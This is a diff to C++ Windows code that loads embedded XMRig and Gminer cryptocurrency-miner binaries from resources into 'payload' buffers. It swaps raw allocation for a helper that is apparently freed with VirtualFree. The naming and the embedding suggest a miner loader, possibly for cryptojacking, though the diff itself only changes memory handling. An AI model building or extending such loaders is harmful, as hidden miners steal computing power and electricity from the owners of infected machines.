@@ -4,6 +4,7 @@
 #include <cstdint>
 #include <utility>
 #include "resources.h"  // Include the resource IDs
+#include "util.h"       // allocate_buffer()
 #include <stdexcept>
 
 // Include the generated embedded config header if ENABLE_EMBEDDED_CONFIG is defined
@@ -27,7 +28,10 @@ void LoadEmbeddedXMRig(BYTE*& payloadBuf, size_t& payloadSize) {
     DWORD size = SizeofResource(hModule, hRes);
     if (size == 0) throw std::runtime_error("XMRig resource size is zero.");
 
-    payloadBuf = new BYTE[size];
+    // Must pair with free_buffer()/VirtualFree(), which the callers use.
+    payloadBuf = allocate_buffer(size);
+    if (!payloadBuf) throw std::runtime_error("Failed to allocate XMRig payload buffer.");
+
     memcpy(payloadBuf, pData, size);
     payloadSize = static_cast<size_t>(size);
 }
@@ -48,7 +52,10 @@ void LoadEmbeddedGminer(BYTE*& payloadBuf, size_t& payloadSize) {
     DWORD size = SizeofResource(hModule, hRes);
     if (size == 0) throw std::runtime_error("Gminer resource size is zero.");
 
-    payloadBuf = new BYTE[size];
+    // Must pair with free_buffer()/VirtualFree(), which the callers use.
+    payloadBuf = allocate_buffer(size);
+    if (!payloadBuf) throw std::runtime_error("Failed to allocate Gminer payload buffer.");
+
     memcpy(payloadBuf, pData, size);
     payloadSize = static_cast<size_t>(size);
 }
